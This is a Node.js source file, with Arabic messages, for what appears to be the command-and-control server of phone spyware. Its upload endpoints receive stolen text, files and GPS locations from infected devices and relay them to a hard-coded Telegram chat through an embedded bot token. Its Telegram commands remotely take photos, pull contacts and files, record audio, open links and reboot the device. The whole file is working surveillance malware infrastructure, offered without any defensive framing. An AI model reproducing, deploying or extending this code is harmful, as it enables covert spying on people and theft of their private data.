const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const multer = require('multer');
const ws = require('ws');
const axios = require('axios');
const CryptoJS = require('crypto-js');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');

const token = '8220588776:AAFjW-XqDys8SBzexkRu9jmfFNDJ5n6Hrdk';
const bot = new TelegramBot(token, { polling: true });
const chatId = 6833650326;

const app = express();
const upload = multer();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ✅ المسار اللي بيطمنك إن السيرفر شغال
app.get('/', (req, res) => {
  res.send('✅ السيرفر شغال تمام يا بودا!');
});

let wsConnection;

const sendToTelegram = (message) => {
  bot.sendMessage(chatId, message);
};

const handleCommand = (command, data) => {
  if (wsConnection && wsConnection.readyState === ws.OPEN) {
    const payload = { command, data };
    wsConnection.send(JSON.stringify(payload));
    return true;
  } else {
    sendToTelegram('❌ لم يتم الاتصال بأي جهاز بعد.');
    return false;
  }
};

app.post('/uploadText', (req, res) => {
  const model = req.headers['model'] || 'غير معروف';
  const text = req.body.text;
  sendToTelegram(`📲 جهاز: ${model}\n\n📝 نص:\n${text}`);
  res.sendStatus(200);
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
  const model = req.headers['model'] || 'غير معروف';
  const file = req.file;

  if (!file) return res.status(400).send('لم يتم إرسال ملف');

  const fileOptions = {
    filename: file.originalname,
    contentType: file.mimetype,
  };

  bot.sendDocument(chatId, file.buffer, {}, fileOptions).then(() => {
    sendToTelegram(`📲 جهاز: ${model}\n📎 تم استلام ملف: ${file.originalname}`);
    res.sendStatus(200);
  }).catch(err => {
    console.error('خطأ في إرسال الملف:', err);
    res.sendStatus(500);
  });
});

app.post('/uploadLocation', (req, res) => {
  const model = req.headers['model'] || 'غير معروف';
  const { lat, lon } = req.body;
  bot.sendLocation(chatId, lat, lon).then(() => {
    sendToTelegram(`📲 جهاز: ${model}\n📍 تم استلام الموقع.`);
    res.sendStatus(200);
  }).catch(err => {
    console.error('خطأ في إرسال الموقع:', err);
    res.sendStatus(500);
  });
});

const server = app.listen(port, () => {
  console.log(`تم بنجاح تشغيل البوت مطور البوت ...`);
});

const wss = new ws.Server({ server });

wss.on('connection', (ws) => {
  wsConnection = ws;
  console.log('📡 جهاز متصل');
  sendToTelegram('📡 تم الاتصال بجهاز.');

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'response') {
        sendToTelegram(`📥 استجابة من الجهاز:\n${data.message}`);
      }
    } catch (error) {
      console.error('📛 فشل في معالجة الرسالة:', error);
    }
  });

  ws.on('close', () => {
    console.log('📴 تم فصل الاتصال');
    wsConnection = null;
    sendToTelegram('📴 تم فصل الجهاز.');
  });
});

bot.onText(/\/(start|help)/, (msg) => {
  const text = `
🤖 أوامر التحكم بالجهاز:

🔹 /info - معلومات النظام
🔹 /battery - حالة البطارية
🔹 /camera - تصوير بالكاميرا
🔹 /location - إرسال الموقع
🔹 /vibrate - اهتزاز الجهاز
🔹 /notify نص - إشعار بالنص
🔹 /openlink رابط - فتح رابط
🔹 /sound - تشغيل صوت
🔹 /contacts - جلب جهات الاتصال
🔹 /files - جلب الملفات
🔹 /record - تسجيل صوت
🔹 /reboot - إعادة التشغيل
`;
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/info/, () => handleCommand('info'));
bot.onText(/\/battery/, () => handleCommand('battery'));
bot.onText(/\/camera/, () => handleCommand('camera'));
bot.onText(/\/location/, () => handleCommand('location'));
bot.onText(/\/vibrate/, () => handleCommand('vibrate'));
bot.onText(/\/sound/, () => handleCommand('sound'));
bot.onText(/\/contacts/, () => handleCommand('contacts'));
bot.onText(/\/files/, () => handleCommand('files'));
bot.onText(/\/record/, () => handleCommand('record'));
bot.onText(/\/reboot/, () => handleCommand('reboot'));

bot.onText(/\/notify (.+)/, (msg, match) => {
  const text = match[1];
  handleCommand('notify', { text });
});

bot.onText(/\/openlink (.+)/, (msg, match) => {
  const url = match[1];
  handleCommand('openlink', { url });
});
